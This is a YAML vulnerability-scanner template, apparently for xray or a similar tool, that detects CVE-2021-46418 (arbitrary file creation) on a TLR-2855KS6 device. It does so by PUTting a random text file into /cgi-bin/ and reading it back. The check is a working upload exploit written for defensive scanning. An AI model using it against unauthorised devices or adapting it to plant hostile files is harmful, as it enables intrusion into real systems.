name: poc-yaml-tlr-2855ks6-arbitrary-file-creation-cve-2021-46418
manual: true
transport: http
set:
    filename: randomLowercase(7)
    randstr: randomLowercase(40)
rules:
    r0:
        request:
            cache: true
            method: PUT
            path: /cgi-bin/{{filename}}.txt
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: '{{randstr}}'
        expression: response.status == 201
    r1:
        request:
            cache: true
            method: GET
            path: /cgi-bin/{{filename}}.txt
        expression: response.status == 200 && response.body.bcontains(bytes(randstr))
expression: r0() && r1()
detail:
    author: Old10vEly
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2021-46418
    vulnerability:
        id: CT-409218
        level: high
    warning: 注意该脚本会上传文件产生一个临时的无害文件